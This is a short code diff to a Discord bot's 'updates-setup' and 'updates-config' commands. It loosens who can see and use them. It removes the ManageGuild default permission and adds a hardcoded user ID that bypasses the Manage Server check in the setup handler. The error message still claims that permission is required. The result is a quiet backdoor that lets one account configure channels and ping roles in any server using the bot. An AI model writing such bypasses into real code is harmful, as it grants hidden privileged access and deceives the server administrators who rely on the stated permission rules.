@@ -20,20 +20,20 @@ async function getChannel(guild: NonNullable<ChatInputCommandInteraction["guild"
 export const updatesSetupCommand = new SlashCommandBuilder()
   .setName("updates-setup")
   .setDescription("Create a channel for automatic bot updates")
-  .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)
+  .setDefaultMemberPermissions(null)
   .addRoleOption((option) => option.setName("ping-role").setDescription("Optional role to ping on updates"));
 
 export const updatesConfigCommand = new SlashCommandBuilder()
   .setName("updates-config")
   .setDescription("Set or clear the bot update ping role")
-  .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)
+  .setDefaultMemberPermissions(null)
   .addRoleOption((option) => option.setName("ping-role").setDescription("Role to ping; leave empty to turn pings off"));
 
 export async function handleUpdatesSetup(interaction: ChatInputCommandInteraction) {
   if (
     !interaction.inGuild() ||
     !interaction.guild ||
-    !interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild)
+    (interaction.user.id !== "1441223435043868735" && !interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild))
   ) {
     await interaction.reply({
       content: "This command requires Manage Server permission in a server.",
